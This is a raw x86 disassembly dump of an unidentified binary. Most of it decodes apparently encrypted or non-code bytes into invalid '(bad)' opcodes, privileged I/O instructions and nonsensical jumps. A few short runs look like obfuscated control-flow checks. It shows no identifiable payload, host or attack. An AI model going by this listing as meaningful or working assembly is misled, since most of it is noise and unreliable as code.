  402132:	pop    ebp
  402133:	sbb    esi,DWORD PTR [edx-0x4a]
  402136:	jmp    0x6f1a6f1c
  40213b:	jnp    0x4020fe
  40213d:	cmp    edx,DWORD PTR [ecx+0x4cc2e0b3]
  402143:	jp     0x40214c
  402145:	out    0xe3,al
  402147:	dec    esi
  402148:	mov    BYTE PTR [esi+0x4cd5d97],dl
  40214e:	pop    fs
  402150:	jne    0x402166
  402152:	jl     0x40210b
  402154:	push   ds
  402155:	push   edi
  402156:	imul   eax,DWORD PTR [ecx+ebx*2],0x26
  40215a:	mov    ds:0x81e239d9,eax
  40215f:	cmp    al,0xc0
  402161:	je     0x402144
  402163:	pop    ss
  402164:	xor    al,0xdb
  402166:	(bad)  
  402167:	rcpps  xmm6,XMMWORD PTR [ebp-0x14]
  40216b:	daa    
  40216c:	fs lahf 
  40216e:	repz not dl
  402171:	popa   
  402172:	mov    ?,WORD PTR [edi+esi*2]
  402175:	sbb    al,0x76
  402177:	iret   
  402178:	pop    edi
  402179:	xor    BYTE PTR [ebp+0x37f76c58],al
  40217f:	mov    bh,0xb7
  402181:	sbb    ecx,ecx
  402183:	test   ebx,edx
  402185:	mov    ebx,0xa455915
  40218a:	mov    edi,ss
  40218c:	xchg   DWORD PTR [eax],edx
  40218e:	ret    
  40218f:	sub    dh,BYTE PTR [ebp-0x4a]
  402192:	add    BYTE PTR [esi],al
  402194:	(bad)  
  402195:	pop    edx
  402196:	push   ebp
  402197:	or     eax,0xae9bbc8a
  40219c:	adc    edx,esp
  40219e:	add    eax,DWORD PTR [eax]
  4021a0:	adc    dl,dl
  4021a2:	lds    edi,FWORD PTR [ecx]
  4021a4:	jbe    0x4021d6
  4021a6:	shld   DWORD PTR [esi-0xdc3e046],esi,cl
  4021ad:	es sahf 
  4021af:	mov    esp,DWORD PTR [ebx]
  4021b1:	cld    
  4021b2:	sub    al,0x85
  4021b4:	fsubr  QWORD PTR ds:0xa8926545
  4021ba:	and    eax,0xe784acb6
  4021bf:	push   ebp
  4021c0:	jb     0x402194
  4021c2:	xchg   ebp,eax
  4021c3:	stc    
  4021c4:	cmp    eax,0xb4131f44
  4021c9:	bswap  esi
  4021cb:	inc    edi
  4021cc:	fnstcw WORD PTR [ecx+0x47f6c39]
  4021d2:	xchg   ecx,eax
  4021d3:	aaa    
  4021d4:	inc    eax
  4021d5:	and    eax,0x74e447e1
  4021da:	js     0x40224d
  4021dc:	mov    esp,0x9cafb579
  4021e1:	inc    ebp
  4021e2:	or     eax,DWORD PTR [eax-0x8f9aeb4]
  4021e8:	pop    ecx
  4021e9:	cmc    
  4021ea:	pop    edx
  4021eb:	fdivr  QWORD PTR [esp+ecx*4]
  4021ee:	pop    ebp
  4021ef:	mov    cl,dh
  4021f1:	shl    DWORD PTR [edx+edi*1],cl
  4021f4:	jecxz  0x4021d0
  4021f6:	pop    ds
  4021f7:	inc    esi
  4021f8:	xchg   ebx,eax
  4021f9:	popa   
  4021fa:	int3   
  4021fb:	(bad)
  4021fe:	sbb    DWORD PTR [ebx+0x41],ecx
  402201:	out    0xb4,eax
  402203:	jmp    0x58a5:0x37f1bcb1
  40220a:	adc    BYTE PTR [edi+0x73],al
  40220d:	in     eax,0xb7
  40220f:	xchg   ecx,eax
  402210:	stos   DWORD PTR es:[edi],eax
  402211:	push   eax
  402212:	or     al,0x46
  402214:	add    ebp,DWORD PTR [ebx-0x20]
  402217:	adc    bl,BYTE PTR [edi-0x50]
  40221a:	jl     0x40223f
  40221c:	int    0x4e
  40221e:	hlt    
  40221f:	clc    
  402220:	jbe    0x402275
  402222:	fistp  WORD PTR [eax+0x46]
  402225:	sub    DWORD PTR [ebx-0x69],edi
  402228:	pop    ds
  402229:	sbb    bh,BYTE PTR [ecx+edi*8+0x57]
  40222d:	pop    ss
  40222e:	das    
  40222f:	lock mov cl,0x52
  402232:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402233:	nop
  402234:	sti    
  402235:	push   edx
  402236:	pop    ss
  402237:	add    DWORD PTR [edx+ebx*4+0x69],esp
  40223b:	test   al,0xaf
  40223d:	sub    al,0xe6
  40223f:	sar    DWORD PTR [edi+0x9],1
  402242:	cmp    ebp,DWORD PTR [ebp+0x110ae264]
  402248:	jg     0x402218
  40224a:	and    DWORD PTR [edx],ecx
  40224c:	jle    0x40227d
  40224e:	sbb    edx,DWORD PTR [eax+0x6919842b]
  402254:	add    ecx,DWORD PTR [ebx+0x4d2e073b]
  40225a:	and    eax,0x610ff1fd
  40225f:	lea    esi,[edx-0x73]
  402262:	xchg   edi,eax
  402263:	pusha  
  402264:	ret    0x6cd1
  402267:	ss jbe 0x402286
  40226a:	sub    al,BYTE PTR [edi]
  40226c:	or     esp,DWORD PTR [ebp-0xd]
  40226f:	mov    ebp,0xe71252dc
  402274:	jp     0x4022c3
  402276:	je     0x4026fd
  40227c:	mov    eax,DWORD PTR [ebp-0x14]
  40227f:	xor    eax,ecx
  402281:	add    eax,esi
  402283:	mov    DWORD PTR [ebp-0x30],eax
  402286:	mov    eax,DWORD PTR [ebp-0x34]
  402289:	jmp    0x4024a6
  40228e:	jp     0x40222b
  402290:	sbb    al,0xe8
  402292:	cdq    
  402293:	ja     0x402267
  402295:	jno    0x40227a
  402297:	sbb    al,0x20
  402299:	sub    DWORD PTR [edi+eiz*8],eax
  40229c:	call   0x70429315
  4022a1:	jo     0x402313
  4022a3:	jle    0x402315
  4022a5:	jo     0x4022cf
  4022a7:	ret    
  4022a8:	mov    dh,0x7c
  4022aa:	inc    esp
  4022ab:	and    bl,al
  4022ad:	in     al,dx
  4022ae:	mov    esp,0x1cbb3f96
  4022b3:	cmp    esp,DWORD PTR [ebx+eiz*1-0x5adb41ac]
  4022ba:	xlat   BYTE PTR ds:[ebx]
  4022bb:	pusha  
  4022bc:	sub    BYTE PTR [esi],al
  4022be:	int3   
  4022bf:	jae    0x40231d
  4022c1:	(bad)  
  4022c3:	ins    DWORD PTR es:[edi],dx
  4022c4:	mov    ch,0x6f
  4022c6:	ffree  st(3)
  4022c8:	rcr    DWORD PTR [eax-0x53],cl
  4022cb:	into   
  4022cc:	jp     0x40228b
  4022ce:	lahf   
  4022cf:	mov    bh,BYTE PTR [eax]
  4022d1:	inc    eax
  4022d2:	jmp    0x402277
  4022d4:	mov    cl,0xdf
  4022d6:	cmp    ch,BYTE PTR [ebx-0x75ef2446]
  4022dc:	jl     0x402281
  4022de:	out    dx,eax
  4022df:	fs dec edx
  4022e1:	mov    eax,ds:0x1e08e358
  4022e6:	shl    DWORD PTR [eax-0x6406eb0b],cl
  4022ec:	push   ebx
  4022ed:	(bad)  
  4022ee:	xchg   esp,eax
  4022ef:	icebp  
  4022f0:	(bad)  
  4022f1:	mov    ecx,0xbd673203
  4022f6:	add    al,0xc3
  4022f8:	push   0xffffffdb
  4022fa:	mov    al,ds:0xf4116e89
  4022ff:	and    edx,DWORD PTR [esi]
  402301:	jmp    0xc02b3521
  402306:	stc    
  402307:	out    dx,al
  402308:	out    0xc6,eax
  40230a:	sar    DWORD PTR [edx],1
  40230c:	add    dl,0xe2
  40230f:	icebp  
  402310:	jl     0x4022da
  402312:	sbb    esp,DWORD PTR [ebp-0x74]
  402315:	push   ds
  402316:	jmp    0x4022e1
  402318:	jecxz  0x4022be
  40231a:	pop    DWORD PTR [ebx+0x5c40bf9b]
  402320:	cmp    ebp,DWORD PTR [esi+0x22]
  402323:	sbb    eax,0xb4b20164
  402328:	ret    0x5b4c
  40232b:	sbb    dl,BYTE PTR [eax-0x1ed63bda]
  402331:	lods   al,BYTE PTR ds:[esi]
  402332:	iret   
  402333:	jnp    0x402375
  402335:	popf   
  402336:	dec    ecx
  402337:	gs push ebp
  402339:	adc    DWORD PTR [edx+0x26],eax
  40233c:	pop    ds
  40233d:	and    dl,BYTE PTR [ebx+0x10]
  402340:	mov    al,0x7c
  402342:	add    BYTE PTR [eax],al
  402344:	ins    DWORD PTR es:[edi],dx
  402345:	sub    bl,0xd1
  402348:	dec    esp
  402349:	rcl    BYTE PTR [edx+0x6ced3ff4],1
  40234f:	es inc esp
  402351:	add    al,dh
  402353:	add    DWORD PTR [ebx+0x31f9460b],edx
  402359:	fisttp WORD PTR ds:0x975e6d5d
  40235f:	jb     0x402314
  402361:	mov    ah,BYTE PTR [ebx+0x1a]
  402364:	cmp    BYTE PTR [eax-0x61e23725],0x4d
  40236b:	data16 test BYTE PTR [ebp+0x652af83d],bh
  402372:	int3   
  402373:	or     bh,BYTE PTR [esi]
  402375:	sahf   
  402376:	pop    ecx
  402377:	test   DWORD PTR [ecx-0x73928f8d],eax
  40237d:	cmp    al,0x5b
  40237f:	xor    eax,0xd2d909c3
  402384:	cs inc esi
  402386:	adc    DWORD PTR [ebx+0x1a69f099],esi
  40238c:	popa   
  40238d:	pop    ebp
  40238e:	lea    ebx,[edi-0x399c794f]
  402394:	adc    BYTE PTR [edi-0x28],ah
  402397:	xor    bh,BYTE PTR [edi+eiz*4+0x62]
  40239b:	out    dx,eax
  40239c:	sub    eax,edi
  40239e:	xchg   esp,eax
  40239f:	pop    esi
  4023a0:	sbb    esp,DWORD PTR [edi]
  4023a2:	xchg   esi,eax
  4023a3:	arpl   WORD PTR [ebp-0x755e7c91],dx
  4023a9:	xchg   esi,eax
  4023aa:	(bad)
  4023ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4023af:	std    
  4023b0:	xchg   edx,eax
  4023b1:	into   
  4023b2:	inc    ebx
  4023b3:	and    ecx,ecx
  4023b5:	test   DWORD PTR [esi+0x680478e6],esi
  4023bb:	in     al,dx
  4023bc:	ss in  al,dx
  4023be:	mov    bh,0x77
  4023c0:	inc    ebx
  4023c1:	clc    
  4023c2:	int    0x36
  4023c4:	cld    
  4023c5:	mov    ss,eax
  4023c7:	xrelease mov DWORD PTR [ebx-0x2a31c850],ecx
  4023ce:	in     al,dx
  4023cf:	pop    esp
  4023d0:	cmp    eax,0xb284279d
  4023d5:	in     eax,0x50
  4023d7:	xor    DWORD PTR [ebx],ebx
  4023d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4023da:	sbb    esi,DWORD PTR [edx+0x3f]
  4023dd:	or     eax,0xb49dd0fa
  4023e2:	jmp    0x6b34:0x87569f10
  4023e9:	or     dh,BYTE PTR [ecx+0x79660b4]
  4023ef:	hlt    
  4023f0:	add    eax,0x88baaa
  4023f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4023f6:	pop    eax
  4023f7:	dec    ebp
  4023f8:	dec    edx
  4023f9:	pop    ss
  4023fa:	fiadd  WORD PTR [ebp-0x5ab01cee]
  402400:	in     eax,dx
  402401:	daa    
  402402:	push   ds
  402403:	es ret 
  402405:	mov    bl,bh
  402407:	pop    edx
  402408:	sti    
  402409:	dec    edx
  40240a:	push   edx
  40240b:	adc    DWORD PTR [esi-0x58],0xf1ad566c
  402412:	sbb    al,0x73
  402414:	mov    eax,0xe7b698e6
  402419:	lods   eax,DWORD PTR ds:[esi]
  40241a:	adc    esp,DWORD PTR [ecx+eax*4-0x34]
  40241e:	out    dx,eax
  40241f:	push   esp
  402420:	or     BYTE PTR [eax],al
  402422:	(bad)  
  402423:	fld    QWORD PTR [esi+0x58]
  402426:	jl     0x40249f
  402428:	mov    BYTE PTR [ecx+ebx*1],0x4c
  40242c:	pushf  
  40242d:	mov    cl,BYTE PTR [esi+0x3a]
  402430:	xor    al,0xe8
  402432:	bound  ebx,QWORD PTR ds:0xd114dc30
  402438:	sub    al,0x22
  40243a:	jle    0x40240f
  40243c:	add    al,0x3b
  40243e:	mov    edi,0xf531caf8
  402443:	hlt    
  402444:	push   ebp
  402445:	sub    edi,ebp
  402447:	xchg   edi,eax
  402448:	mov    al,0x2a
  40244a:	push   edi
  40244b:	inc    ecx
  40244d:	xchg   DWORD PTR [eax-0x75],edx
  402450:	das    
  402451:	cmp    eax,0x1283cd28
  402456:	or     BYTE PTR ds:[ebp-0x177afd4e],dl
  40245d:	mov    dh,0xf
  40245f:	sub    ch,BYTE PTR [ecx+ecx*4+0x47]
  402463:	stos   BYTE PTR es:[edi],al
  402464:	imul   BYTE PTR [edx]
  402466:	ret    0x24af
  402469:	imul   esp,DWORD PTR [ecx],0xffffffa0
  40246c:	ss jo  0x4024b6
  40246f:	jae    0x402459
  402471:	xchg   edx,eax
  402472:	leave  
  402473:	arpl   sp,sp
  402475:	popf   
  402476:	sbb    eax,0x771defb8
  40247b:	pop    ebp
  40247c:	or     al,0x71
  40247e:	cdq    
  40247f:	push   edx
  402480:	and    al,0x7e
  402482:	stc    
  402483:	and    al,0xa8
  402485:	in     al,0xa4
  402487:	mov    eax,ds:0x40b4d7fc
  40248c:	mov    eax,0x89992e7b
  402491:	or     al,0xa4
  402493:	jns    0x402421
  402495:	hlt    
  402496:	nop
  402497:	sub    esp,esp
  402499:	out    0x69,eax
  40249b:	std    
  40249c:	enter  0xde4e,0x3f
  4024a0:	imul   edi,DWORD PTR [ebp+0x14d89d3],0x66
  4024a7:	mov    edx,DWORD PTR [ebp-0x38]
  4024aa:	mov    ebx,0x8a3e
  4024af:	xor    dx,bx
  4024b2:	mov    ebx,DWORD PTR [ebp-0x8]
  4024b5:	add    dx,di
  4024b8:	movzx  edx,dx
  4024bb:	xor    ebx,ecx
  4024bd:	lea    edx,[edx+ebx*1+0x32729c]
  4024c4:	add    DWORD PTR [eax],edx
  4024c6:	mov    eax,DWORD PTR [ebp-0x2c]
  4024c9:	mov    edx,DWORD PTR [ebp-0x8]
  4024cc:	mov    ebx,DWORD PTR [ebp-0x30]
  4024cf:	xor    edx,ecx
  4024d1:	add    edx,esi
  4024d3:	imul   edx,ebx
  4024d6:	sub    DWORD PTR [eax],edx
  4024d8:	mov    eax,DWORD PTR [ebp-0x14]
  4024db:	jmp    0x402730
  4024e0:	jmp    0x4026fd
  4024e5:	and    DWORD PTR [edi+edi*4+0x31714d76],esi
  4024ec:	jae    0x40250e
  4024ee:	xor    BYTE PTR [ecx-0x586991c9],cl
  4024f4:	pop    eax
  4024f5:	jo     0x4024f7
  4024f7:	jo     0x402569
  4024f9:	jo     0x402579
  4024fb:	jo     0x40256d
  4024fd:	es test esi,esp
  402500:	pop    ecx
  402501:	jge    0x4024dc
  402503:	(bad)  
  402504:	mov    gs,WORD PTR [ecx-0x5926a761]
  40250a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40250b:	sbb    al,0x6f
  40250d:	pop    esp
  40250e:	stc    
  40250f:	das    
  402510:	pop    edx
  402511:	xor    al,0xbc
  402513:	mov    dh,0x6e
  402515:	jmp    0xb6d1f0d4
  40251a:	jl     0x4024c8
  40251c:	cs out dx,eax
  40251e:	stc    
  40251f:	adc    BYTE PTR [edx+0x61],ch
  402522:	push   cs
  402523:	xchg   esi,eax
  402524:	and    BYTE PTR [eax-0x29856e9],ch
  40252a:	daa    
  40252b:	jne    0x4024c4
  40252d:	jae    0x40258e
  40252f:	or     BYTE PTR [edx-0x66],dl
  402532:	and    edx,DWORD PTR [edi+eiz*8+0x7aeb2a2b]
  402539:	pop    esp
  40253a:	cmp    DWORD PTR [ebx],edi
  40253c:	and    al,0x2b
  40253e:	mov    esp,0xe129a29f
  402543:	aad    0x5
  402545:	push   esi
  402546:	sub    DWORD PTR [edi-0x61],ebp
  402549:	and    dh,bh
  40254b:	push   0xffffff80
  40254d:	fsubrp st(4),st
  40254f:	xlat   BYTE PTR ds:[ebx]
  402550:	inc    esi
  402551:	xchg   ebx,eax
  402552:	or     bl,BYTE PTR [ebx-0x1265234e]
  402558:	test   DWORD PTR [ecx+0x17],ebp
  40255b:	cmp    al,0xd9
  40255d:	adc    DWORD PTR [ecx-0x77],0x27
  402561:	imul   eax,DWORD PTR es:[edi+0x38],0xffffffc3
  402566:	popf   
  402567:	pushf  
  402568:	(bad)  
  402569:	cmp    eax,0x615618f
  40256e:	mov    DWORD PTR [eax],eax
  402570:	nop
  402571:	mov    bl,0x26
  402573:	sbb    BYTE PTR [eax+0x1651979d],bh
  402579:	pop    ebp
  40257a:	push   edi
  40257b:	repz xchg edx,eax
  40257d:	popa   
  40257e:	sbb    esp,eax
  402580:	and    DWORD PTR [eax],esp
  402582:	adc    esi,DWORD PTR [ecx]
  402584:	daa    
  402585:	fcomp  DWORD PTR [edx]
  402587:	pop    ds
  402588:	jmp    0xe1358ef6
  40258d:	push   ds
  40258e:	repnz sbb BYTE PTR [ebx+edx*4-0x599070ee],al
  402596:	mov    dh,0x14
  402598:	jl     0x40254b
  40259a:	pop    edx
  40259b:	pop    ebp
  40259c:	in     eax,dx
  40259d:	xor    al,ch
  40259f:	lods   eax,DWORD PTR ds:[esi]
  4025a0:	(bad)  
  4025a1:	inc    ecx
  4025a2:	mov    esi,0x5ce36f74
  4025a7:	fsub   DWORD PTR ss:[ebx]
  4025aa:	inc    ecx
  4025ab:	add    ah,ch
  4025ad:	jl     0x402611
  4025af:	js     0x402555
  4025b1:	retf   
  4025b2:	jecxz  0x402547
  4025b4:	stos   BYTE PTR es:[edi],al
  4025b5:	rcr    DWORD PTR [esi+0x1b],1
  4025b8:	inc    edi
  4025b9:	adc    BYTE PTR [eax],dh
  4025bb:	adc    DWORD PTR [eax+0x2d99d928],ebp
  4025c1:	mov    bh,0x8c
  4025c3:	retf   0xabe8
  4025c6:	mov    eax,0x528ff9a0
  4025cb:	and    al,0x7f
  4025cd:	cmp    BYTE PTR [edx+eax*4+0xfb981eb],al
  4025d4:	and    bh,ah
  4025d6:	mov    cl,0xd9
  4025d8:	adc    BYTE PTR [edi-0x1f],dh
  4025db:	xor    cl,BYTE PTR [ecx-0x8800cc9]
  4025e1:	into   
  4025e2:	mov    DWORD PTR [esp-0x6c],esi
  4025e6:	sbb    al,0x5d
  4025e8:	pusha  
  4025e9:	cmp    eax,0x934ce5d8
  4025ee:	pop    ds
  4025ef:	shr    BYTE PTR [edx-0x5488b7be],1
  4025f5:	imul   edi,DWORD PTR [ecx-0x1d],0xe8039625
  4025fc:	and    DWORD PTR [eax+0x1a],edx
  4025ff:	xor    al,0xde
  402601:	je     0x4025e7
  402603:	iret   
  402604:	push   esp
  402605:	or     dh,al
  402607:	dec    esp
  402608:	popf   
  402609:	push   eax
  40260a:	pop    ds
  40260b:	lods   al,BYTE PTR ds:[esi]
  40260c:	je     0x402654
  40260e:	push   eax
  40260f:	xor    eax,DWORD PTR [eax+0x11ddb7b1]
  402615:	push   es
  402616:	test   al,0xfd
  402618:	sbb    dh,0xa5
  40261b:	pop    ebp
  40261c:	or     al,0x13
  40261e:	dec    edx
  40261f:	dec    esi
  402620:	hlt    
  402621:	in     eax,0x66
  402623:	or     eax,0xf1c152e
  402628:	sbb    al,0x91
  40262a:	jae    0x402618
  40262c:	imul   esi,DWORD PTR [edx+eax*2+0x7e7b9c5f],0xd79a67cd
  402637:	adc    al,0xf4
  402639:	mov    al,0xfb
  40263b:	ret    
  40263c:	sub    al,0x82
  40263e:	xchg   cl,cl
  402640:	and    eax,0xa4d5496e
  402645:	xor    eax,ebp
  402647:	mov    ecx,0xf5c3c430
  40264c:	popf   
  40264d:	inc    eax
  40264e:	pop    ss
  40264f:	push   0xf9b82548
  402654:	sbb    al,0x20
  402656:	cmp    al,0xd4
  402658:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402659:	add    al,0xd8
  40265b:	mov    al,0xa1
  40265d:	fldl2t 
  40265f:	fstp   QWORD PTR [esi+0xc]
  402662:	sub    eax,0x7ddbdfe3
  402667:	fdivr  DWORD PTR [esi-0x6dc88c71]
  40266d:	add    eax,0x1d77ef4
  402672:	in     al,0x19
  402674:	repnz aad 0x33
  402677:	mov    ah,0xf8
  402679:	gs sub al,0xe2
  40267c:	and    eax,0x734b8546
  402681:	ds sahf 
  402683:	jb     0x402625
  402685:	jns    0x402643
  402687:	mov    es,WORD PTR [edi+0x2d]
  40268a:	bound  esi,QWORD PTR [ebx]
  40268c:	pop    edx
  40268d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40268e:	xor    BYTE PTR [ecx-0x4a],dh
  402691:	pop    esi
  402692:	jbe    0x402616
  402694:	(bad)  
  402695:	inc    esp
  402696:	neg    DWORD PTR [ecx+0x77]
  402699:	sub    BYTE PTR [ebx+0x5cabf129],ch
  40269f:	outs   dx,DWORD PTR ds:[esi]
  4026a0:	leave  
  4026a1:	imul   esp,ebx,0xffffff92
  4026a4:	or     DWORD PTR [ebp+0x11],esp
  4026a7:	cmp    bl,BYTE PTR [ebx+0x6d]
  4026aa:	cmp    eax,0x70e5f469
  4026af:	jae    0x40270e
  4026b1:	aam    0xe5
  4026b3:	mov    ds:0x831f2ef8,al
  4026b8:	inc    ecx
  4026b9:	pop    eax
  4026ba:	aam    0x3d
  4026bc:	imul   esp,ebp,0xea760f60
  4026c2:	leave  
  4026c3:	fsin   
  4026c5:	bndstx [eax],bnd1
  4026c8:	mov    dh,BYTE PTR [edi-0x6ecc29fb]
  4026ce:	sbb    ah,BYTE PTR [esi]
  4026d0:	sub    ebx,DWORD PTR [edx-0x66]
  4026d3:	leave  
  4026d4:	jp     0x402679
  4026d6:	mov    bh,0x66
  4026d8:	(bad)  
  4026da:	sub    eax,0xe4f63ffc
  4026e0:	sbb    eax,0xedc801fd
  4026e5:	fwait
  4026e6:	test   al,0x49
  4026e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4026e9:	adc    BYTE PTR [eax+0x172ff708],dh
  4026ef:	popa   
  4026f0:	adc    DWORD PTR [eax+0x72],esi
  4026f3:	in     eax,0xcf
  4026f5:	je     0x40271a
  4026f7:	sbb    eax,DWORD PTR [ebp-0x768e8b58]
  4026fd:	mov    eax,DWORD PTR [ebp-0xc]
  402700:	mov    edx,DWORD PTR [ebp-0x18]
  402703:	xor    eax,edx
  402705:	cmp    eax,0x8cb40b7d
  40270a:	je     0x40272d
  402710:	mov    eax,DWORD PTR [ebp-0x10]
  402713:	add    DWORD PTR [eax],0x7403501
  402719:	jmp    0x40272d
  40271e:	mov    eax,DWORD PTR [ebp-0x1c]
  402721:	cmp    DWORD PTR [eax],0xf89f2da9
  402727:	jne    0x402748
  40272d:	mov    eax,DWORD PTR [ebp-0x8]
  402730:	xor    eax,ecx
  402732:	add    eax,esi
  402734:	test   eax,eax
  402736:	jne    0x402748
  40273c:	xor    DWORD PTR [ebp-0x20],0xe149ebe
  402743:	jmp    0x4012bf
  402748:	pop    ebx
  402749:	pop    edi
  40274a:	jmp    0x402967
  40274f:	cs dec edi
  402751:	add    dl,bl
  402753:	popa   
  402754:	push   ecx
  402755:	in     eax,dx
  402756:	jno    0x4026ea
  402758:	imul   ebx,DWORD PTR [ecx+esi*8],0xe9828c2b
  40275f:	jo     0x40276f
  402761:	jo     0x4027d3
  402763:	jo     0x4027e3
  402765:	jo     0x4027d7
  402767:	gs std 
  402769:	mov    edx,0xc663710b
  40276e:	fisttp QWORD PTR [ebx]
  402770:	mov    ch,0xde
  402772:	xchg   BYTE PTR [ebx+0x2fbb137],bl
  402778:	dec    edi
  402779:	jle    0x40272f
  40277b:	mov    ebp,0xfb0744ae
  402780:	and    BYTE PTR [edx-0x1fa19535],dh
  402786:	pminsw mm4,QWORD PTR [ecx+0x5560777f]
  40278d:	out    0xd4,al
  40278f:	fwait
  402790:	out    dx,eax
  402791:	adc    dl,al
  402793:	pusha  
  402794:	push   cs
  402795:	push   ecx
  402796:	mov    cl,0x8d
  402798:	leave  
  402799:	dec    edx
  40279a:	pop    esi
  40279b:	int3   
  40279c:	pop    esp
  40279d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40279e:	cmp    DWORD PTR [ecx+0x37b861c],0xe1f4168a
  4027a8:	xlat   BYTE PTR ds:[ebx]
  4027a9:	mov    edx,0x1b52693a
  4027ae:	and    esp,DWORD PTR ds:0xd8d2f24e
  4027b4:	nop
  4027b5:	xor    edi,DWORD PTR [eax-0x6b09c769]
  4027bb:	retf   
  4027bc:	mov    al,ds:0x9f4be93c
  4027c1:	jmp    0x739e:0x57af6ae5
  4027c8:	in     al,dx
  4027c9:	lahf   
  4027ca:	fstp   st(0)
  4027cc:	cmp    ch,BYTE PTR [eax]
  4027ce:	inc    edx
  4027cf:	ud0    esp,ebx
  4027d2:	mov    ch,0xa3
  4027d4:	cmp    eax,DWORD PTR [edx-0x1f]
  4027d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4027d8:	xchg   edi,eax
  4027d9:	xchg   BYTE PTR [eax+0x2],dh
  4027dc:	test   al,0xad
  4027de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4027df:	rcl    BYTE PTR gs:[ebp+0x4cbb6c22],0xc
  4027e7:	cmp    BYTE PTR [esi-0x42],0x58
  4027eb:	mov    cl,0x49
  4027ed:	cld    
  4027ee:	scas   al,BYTE PTR es:[edi]
  4027ef:	inc    edi
  4027f0:	xchg   edx,eax
  4027f1:	inc    eax
  4027f2:	add    cl,BYTE PTR [edx+0x66eca8c7]
  4027f8:	push   esi
  4027f9:	leave  
  4027fa:	dec    esi
  4027fb:	inc    esp
  4027fc:	adc    ecx,DWORD PTR [ebx]
  4027fe:	loop   0x40284c
  402800:	daa    
  402801:	dec    edx
  402802:	fcmovnb st,st(2)
  402804:	repz icebp 
  402806:	fmul   st(6),st
  402808:	data16 mov dl,ah
  40280b:	leave  
  40280c:	dec    esp
  40280d:	jmp    0x402808
  40280f:	xor    al,BYTE PTR [eax+eiz*8-0x10a872d6]
  402816:	dec    ecx
  402817:	sbb    edi,DWORD PTR [edi+0x1ae49218]
  40281d:	stos   DWORD PTR es:[edi],eax
  40281e:	lahf   
  40281f:	push   ebx
  402820:	dec    esp
  402821:	sar    BYTE PTR [esi-0x10],1
  402824:	ins    BYTE PTR es:[edi],dx
  402825:	inc    edi
  402826:	adc    eax,0xb5356bd2
  40282b:	cli    
  40282c:	mul    BYTE PTR [ecx+0x6c8a073]
  402832:	fadd   QWORD PTR [ebx]
  402834:	(bad)  
  402835:	dec    edx
  402836:	mov    ecx,0x3173521c
  40283b:	(bad)  
  40283c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40283d:	push   edx
  40283e:	mov    al,BYTE PTR [edx]
  402840:	call   0x906a:0xcf5ad71
  402847:	lea    edx,[esi+esi*8-0x5a36add8]
  40284e:	sbb    cl,al
  402850:	mov    bl,0xb5
  402852:	or     bl,cl
  402854:	repz (bad) [esi-0x504d346b]
  40285b:	int    0x37
  40285d:	add    ebx,0xffffffac
  402860:	mov    ah,0x55
  402862:	arpl   bp,sp
  402864:	stos   DWORD PTR es:[edi],eax
  402865:	(bad)  
  402867:	push   edx
  402868:	mov    bh,0xe9
  40286a:	jmp    0x40285a
  40286c:	mov    bl,0x22
  40286e:	jne    0x402891
  402870:	dec    esi
  402871:	pop    esp
  402872:	sahf   
  402873:	loop   0x4028db
  402875:	enter  0xccc9,0xd6
  402879:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40287a:	adc    eax,0x6988ba95
  40287f:	adc    ebx,DWORD PTR [edx+0x21]
  402882:	popf   
  402883:	cs leave 
  402885:	pop    edi
  402886:	fadd   st,st(5)
  402888:	addr16 clc 
  40288a:	addr16 out dx,al
  40288c:	and    DWORD PTR [ebx-0x35],eax
  40288f:	es mov edi,0x3bc7c7e7
  402895:	pop    edi
  402896:	iret   
  402897:	adc    cl,BYTE PTR [esi]
  402899:	loop   0x40289c
  40289b:	aas    
  40289c:	(bad)  
  40289e:	inc    ecx
  40289f:	jmp    0xb28:0x1bddbbf4
  4028a6:	dec    ebx
  4028a7:	iret   
  4028a8:	fs repz fld st(7)
  4028ac:	call   0x61f1:0x9ec9e26
  4028b3:	stc    
  4028b4:	and    al,0x26
  4028b6:	lods   al,BYTE PTR ds:[esi]
  4028b7:	mov    WORD PTR [esi],es
  4028b9:	repnz stos DWORD PTR es:[edi],eax
  4028bb:	xchg   edi,eax
  4028bc:	xchg   ebx,eax
  4028bd:	pop    esi
  4028be:	imul   edx,DWORD PTR [ecx],0x268d3d2d
  4028c4:	es jmp 0xe0fccf29
  4028ca:	dec    edx
  4028cb:	bound  ebp,QWORD PTR [ebp-0x75]
  4028ce:	inc    edx
  4028cf:	and    esp,DWORD PTR [ebx+esi*8]
  4028d2:	sar    DWORD PTR [ecx],1
  4028d4:	clc    
  4028d5:	mov    edi,0x96a7a0ec
  4028da:	ror    DWORD PTR [esi+0x41],1
  4028dd:	fs inc esi
  4028df:	aas    
  4028e0:	xor    eax,0xd9ab19f
  4028e5:	cmp    eax,0xab5c05c2
  4028ea:	or     al,0x67
  4028ec:	lods   al,BYTE PTR ds:[esi]
  4028ed:	cmp    ah,BYTE PTR [edx]
  4028ef:	ins    BYTE PTR es:[edi],dx
  4028f0:	or     BYTE PTR [esp+edi*4],cl
  4028f3:	ins    DWORD PTR es:[edi],dx
  4028f4:	(bad)  
  4028f6:	int    0x81
  4028f8:	or     ecx,DWORD PTR [eax+edx*4+0x2c]
  4028fc:	pop    ss
  4028fd:	ror    BYTE PTR [edx],cl
  4028ff:	call   0x689c:0xb8e894e
  402906:	mov    dh,ah
  402908:	ja     0x4028d1
  40290a:	mov    WORD PTR ds:[esi-0x78],?
  40290e:	push   ds
  40290f:	std    
  402910:	add    al,0x10
  402912:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402913:	lea    ebp,[eax-0x7d]
  402916:	adc    dh,BYTE PTR [edi+0x45]
  402919:	xchg   edx,eax
  40291a:	jmp    0x4028c8
  40291c:	xchg   edx,eax
  40291d:	mov    bh,0x56
  40291f:	les    ecx,FWORD PTR [edi-0x1c]
  402922:	and    eax,0xffffff95
